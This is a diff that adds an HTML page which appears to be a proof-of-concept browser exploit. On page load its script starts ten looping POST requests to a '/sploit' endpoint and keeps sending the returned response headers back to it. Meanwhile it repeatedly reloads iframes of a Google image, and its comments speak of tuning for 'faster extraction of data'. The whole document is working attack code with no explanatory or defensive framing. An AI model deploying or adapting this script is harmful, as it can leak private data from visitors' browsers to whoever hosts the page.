@@ -1,0 +1,48 @@
+<!doctype html>
+<html>
+  <head>
+    <script>
+      var iThreads = 10;    // number of simultanious request "threads", higher = faster extraction of data
+      var iDelay = 100;   // delay between requests in each "thread", lower = faster extraction of data
+      function requestLoop(sDataToSend) {
+        var oXMLHttpRequest = new XMLHttpRequest();
+        oXMLHttpRequest.open("POST", "/sploit", true);
+        oXMLHttpRequest.onreadystatechange = function () {
+          if (oXMLHttpRequest.readyState === 4) {
+            if (oXMLHttpRequest.status == 200) {
+              var sHeaders = oXMLHttpRequest.getAllResponseHeaders();
+              console.log("response =" + oXMLHttpRequest.status + " " + oXMLHttpRequest.statusText);
+              console.log("headers  =" + sHeaders.length + ":[" + sHeaders + "]");
+              if (iDelay > 0) {
+                setTimeout(function() {
+                  requestLoop(sHeaders);
+                }, iDelay);
+              } else {
+                requestLoop(sHeaders);
+              }
+            } else {
+              document.write("Server failed!");
+            }
+          }
+        }
+        oXMLHttpRequest.send(sDataToSend ? JSON.stringify(sDataToSend) : "");
+      }
+      window.addEventListener("load", function () {
+        for (var i = 0; i < iThreads; i++) {
+          requestLoop("");
+          bait("https://www.google.com/webdesigner/images/google-plus-icon.png");
+        }
+      }, true);
+      function bait(sURL) {
+        var oIFrame = document.createElement("iframe");
+        oIFrame.src = sURL;
+        oIFrame.onload = function() {
+          oIFrame.src = sURL + "?" + new Date().valueOf();
+        }
+        document.body.appendChild(oIFrame);
+      }
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
